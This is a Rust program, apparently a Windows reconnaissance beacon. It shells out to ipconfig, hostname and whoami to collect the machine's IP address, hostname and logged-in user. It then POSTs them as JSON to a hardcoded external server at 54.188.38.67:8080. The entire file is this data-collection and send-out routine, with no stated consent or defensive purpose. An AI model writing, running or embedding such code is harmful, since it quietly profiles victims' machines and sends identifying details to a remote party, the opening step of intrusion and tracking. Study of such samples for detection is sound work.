use reqwest::blocking::Client;
use reqwest::header::{CONTENT_TYPE, USER_AGENT};
use serde::{Serialize, Deserialize};
use std::process::Command;

#[derive(Serialize, Deserialize, Debug)]
struct MachineInfo {
    ip: String,
    hostname: String,
    username: String,
}

fn run_command(cmd: &str, args: &[&str]) -> String {
    let output = Command::new("cmd")
        .args(&["/C", cmd])
        .args(args)
        .output()
        .expect("Falha ao executar comando");

    let result = String::from_utf8_lossy(&output.stdout).trim().to_string();
    
    if result.is_empty() {
        "Desconhecido".to_string()
    } else {
        result
    }
}

fn get_ip() -> String {
    run_command("ipconfig", &["|", "findstr", "/R", "\"IPv4\""])
}

fn get_hostname() -> String {
    run_command("hostname", &[])
}

fn get_username() -> String {
    run_command("whoami", &[])
}

fn send_post_request(data: &MachineInfo) -> Result<(), reqwest::Error> {
    let client = Client::new();
    let url = "http://54.188.38.67:8080/";

    let response = client.post(url)
        .header(CONTENT_TYPE, "application/json")
        .header(USER_AGENT, "Windows-Rust-Client")
        .json(data)
        .send()?;

    println!("Response Status: {}", response.status());
    Ok(())
}

fn main() {
    let ip = get_ip();
    let hostname = get_hostname();
    let username = get_username();

    let machine_info = MachineInfo { ip, hostname, username };

    match send_post_request(&machine_info) {
        Ok(_) => println!("Request enviado com sucesso."),
        Err(e) => eprintln!("Erro ao enviar request: {}", e),
    }
}
